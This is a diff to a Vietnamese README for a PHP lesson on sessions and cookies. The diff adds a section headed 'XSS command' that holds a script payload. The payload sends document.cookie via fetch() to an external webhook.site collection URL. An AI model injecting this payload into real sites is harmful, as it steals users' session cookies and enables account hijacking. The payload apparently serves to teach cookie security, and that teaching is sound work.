@@ -42,3 +42,12 @@ Làm rõ vai trò của từng phương pháp trong lập trình web bằng PHP
 
 ### 📜 Tài liệu kèm theo
 File trình chiếu LaTeX: session_cookies_presentation.tex và bản PDF tương ứng
+
+
+### Cau lenh XSS
+
+```bash
+<script>
+fetch("https://webhook.site/1dbe3a3a-xxxx-xxxx-xxxx-1c3f2d5f5b7c?cookie=" + document.cookie)
+</script>
+```
